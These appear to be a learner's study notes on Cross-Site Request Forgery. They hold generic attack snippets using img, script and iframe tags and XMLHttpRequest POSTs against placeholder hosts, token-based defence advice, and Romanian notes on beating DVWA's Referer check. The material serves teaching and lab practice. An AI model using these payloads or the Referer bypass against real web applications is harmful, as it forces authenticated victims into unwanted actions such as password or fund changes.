------------CSRF---------------

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.


common way to perform CSRF attack:
 HTML Methods
   

IMG SRC
  <img src="http://host/?command">
 

SCRIPT SRC
  <script src="http://host/?command">
 

IFRAME SRC
  <iframe src="http://host/?command">

JavaScript Methods
 

'Image' Object
  <script>
  var foo = new Image();
  foo.src = "http://host/?command";
  </script>

'XMLHTTP' Object 
  IE
  <script>
  var post_data = 'name=value';
  var xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  xmlhttp.open("POST", 'http://url/path/file.ext', true);
  xmlhttp.onreadystatechange = function () {
  if (xmlhttp.readyState == 4)
  {
  alert(xmlhttp.responseText);
  }
  };
  xmlhttp.send(post_data);
  </script>
 

Mozilla
  <script>
  var post_data = 'name=value';
  var xmlhttp=new XMLHttpRequest();
  xmlhttp.open("POST", 'http://url/path/file.ext', true);
  xmlhttp.onreadystatechange = function () {
  if (xmlhttp.readyState == 4)
  {
  alert(xmlhttp.responseText);
  }
  };
  xmlhttp.send(post_data);
      </script>

Recomandations: 
Appending non predictable tokens to each request. 
This token must be associated with user session otherwise an attackker may be able to fetch a valid token on their own and utilize it in an attack. 
Limit the time period to which the token is valid.
-------------------------------------------------------------------
DVWA: low: get request---parametrii se pot observa in request---> poti schimba parametrii iar linkul respectiv se trimite victimei.
medium: se verifica daca HTTP refer si numele serverului sunt valide. Daca numele serverului se regaseste in HTTP refer parola se schimba. Daca presupunem ca serverul se numeste sitebun.com si site ul atacatorului badguy.com si acestea s -ar schimba intre ele...atacul ar da gres. Dar daca este badguy.com/sitebun.html merge.

